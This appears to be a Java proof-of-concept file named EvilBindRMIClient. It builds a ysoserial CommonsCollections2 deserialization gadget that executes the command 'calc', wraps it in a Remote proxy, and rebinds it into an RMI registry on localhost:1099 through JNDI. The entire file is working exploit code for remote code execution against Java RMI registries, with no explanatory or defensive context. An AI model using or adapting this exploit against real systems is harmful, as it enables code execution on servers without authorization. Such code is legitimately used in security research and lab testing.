package rmi;

import ysoserial.payloads.CommonsCollections2;
import ysoserial.payloads.util.Gadgets;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.Remote;
import java.util.Hashtable;

public class EvilBindRMIClient {
    public static void main(String[] args) throws Exception {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context ctx = new InitialContext(env);
        Object payload = CommonsCollections2.getObject("calc");
        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("random", payload), Remote.class);
        ctx.rebind("hello", remote);
    }
}
